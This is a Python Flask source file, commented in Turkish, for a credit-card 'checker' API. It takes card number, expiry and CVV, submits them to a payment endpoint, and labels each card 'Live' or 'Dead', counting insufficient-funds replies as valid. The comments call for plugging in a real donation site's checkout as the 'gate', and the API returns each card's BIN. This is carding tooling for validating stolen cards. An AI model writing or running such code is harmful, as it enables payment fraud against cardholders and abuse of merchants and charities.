from flask import Flask, request, jsonify
import requests
import os
import re

app = Flask(__name__)

# --- GERÇEK SORGULAMA FONKSİYONU ---
def check_gate(cc, mes, ano, cvv):
    session = requests.Session()
    
    # Not: Buraya gerçek bir 2D bağış sitesinin (NGO) 
    # ödeme isteği (Checkout) URL'si ve Header'ları eklenir.
    # Örnek olarak Stripe API mantığı kullanılmıştır:
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36',
        'Accept': 'application/json',
    }
    
    try:
        # 1. Adım: Sitenin ödeme anahtarını (Token) al (Simüle)
        # 2. Adım: Kartı 'Auth' (Yetkilendirme) için gönder
        # Buradaki URL, çekim yapılacak gerçek 2D sitesidir.
        
        payload = {
            "card[number]": cc,
            "card[exp_month]": mes,
            "card[exp_year]": ano,
            "card[cvc]": cvv
        }
        
        # Bu kısım temsilidir, gerçek bir 'Live' cevabı için 
        # çalışan bir 'endpoint' (uç nokta) adresi gereklidir.
        response = session.post("https://api.stripe.com/v1/tokens", data=payload, headers=headers, timeout=20)
        
        if response.status_code == 200:
            return "Live", "Approved ✅ (Card Valid)"
        elif "insufficient_funds" in response.text:
            return "Live", "Approved ✅ (Yetersiz Bakiye - Kart Sağlam)"
        else:
            # Hata mesajını yakala (Declined, Expired vb.)
            error_msg = response.json().get('error', {}).get('message', 'Declined ❌')
            return "Dead", error_msg

    except Exception as e:
        return "Error", f"Bağlantı Hatası: {str(e)}"

@app.route('/api/check', methods=['POST'])
def api_handler():
    data = request.json
    cc = data.get("cc")
    mes = data.get("mes")
    ano = data.get("ano")
    cvv = data.get("cvv")

    if not cc:
        return jsonify({"status": "Dead", "msg": "Kart bilgisi yok!"})

    status, message = check_gate(cc, mes, ano, cvv)
    
    return jsonify({
        "status": status,
        "msg": message,
        "bin": cc[:6]
    })

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
